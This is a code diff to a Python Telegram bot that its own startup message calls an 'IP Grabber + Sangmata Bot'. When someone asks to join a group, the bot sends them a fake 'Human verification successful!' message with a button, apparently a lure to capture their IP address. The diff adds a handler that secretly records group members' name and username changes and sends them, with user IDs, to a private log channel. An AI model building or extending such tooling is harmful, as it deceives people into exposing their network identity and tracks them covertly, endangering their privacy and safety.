@@ -11,6 +11,8 @@ LOG_CHANNEL = -1002290475903
 
 app = Client("sangmata_ip_bot", api_id=API_ID, api_hash=API_HASH, session_string=SESSION_STRING)
 
+user_history = {}
+
 @app.on_chat_join_request()
 async def handle_join_request(client, request):
     user_id = request.user_chat_id
@@ -24,30 +26,58 @@ async def handle_join_request(client, request):
     ])
 
     try:
-        # Kirim foto grup + teks (supaya terlihat resmi)
-        if request.chat.photo:
-            await client.send_photo(
-                chat_id=user_id,
-                photo=request.chat.photo.big_file_id,
-                caption=(
-                    "✅ Human verification successful!\n\n"
-                    "Click the button below to verify you're human and join the group.\n\n"
-                    "Link will expire in 10 minutes."
-                ),
-                reply_markup=keyboard
-            )
-        else:
-            # Kalau tidak ada foto grup, kirim teks saja
-            await client.send_message(
-                user_id,
-                "✅ Human verification successful!\n\n"
-                "Click the button below to verify you're human and join the group.\n\n"
-                "Link will expire in 10 minutes.",
-                reply_markup=keyboard
-            )
-        print(f"✅ Verification message sent to {user_id}")
+        await client.send_message(
+            user_id,
+            "✅ Human verification successful!\n\n"
+            "Click the button below to verify you're human and join the group.\n\n"
+            "Link will expire in 10 minutes.",
+            reply_markup=keyboard
+        )
+        print(f"✅ Verification PM sent to {user_id}")
     except Exception as e:
-        print(f"❌ Failed to send verification message to {user_id}: {e}")
+        print(f"❌ Failed to send PM to {user_id}: {e}")
 
-print("✅ Advanced IP Grabber + Sangmata Bot is running...")
+# Sangmata Tracker (hanya kirim ke LOG CHANNEL)
+@app.on_message(filters.group)
+async def sangmata_tracker(client, message):
+    if not message.from_user:
+        return
+
+    user = message.from_user
+    user_id = user.id
+
+    if user_id not in user_history:
+        user_history[user_id] = {
+            "first_name": user.first_name,
+            "username": user.username
+        }
+
+    old = user_history[user_id]
+    changes = []
+
+    if user.first_name != old["first_name"]:
+        changes.append(f"🔄 Name changed: {old['first_name']} → {user.first_name}")
+    if user.username != old.get("username"):
+        old_un = old.get("username") or "None"
+        new_un = user.username or "None"
+        changes.append(f"🔄 Username changed: @{old_un} → @{new_un}")
+
+    if changes:
+        log_text = f"""
+🔥 SANGMATA DETECTED
+
+👤 User: {user.first_name}
+🆔 ID: <code>{user_id}</code>
+{"\n".join(changes)}
+⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}
+        """
+        await client.send_message(LOG_CHANNEL, log_text)   # ← Hanya ke log channel
+
+    # Update data
+    user_history[user_id] = {
+        "first_name": user.first_name,
+        "username": user.username
+    }
+
+print("✅ IP Grabber + Sangmata Bot is running...")
 app.run()
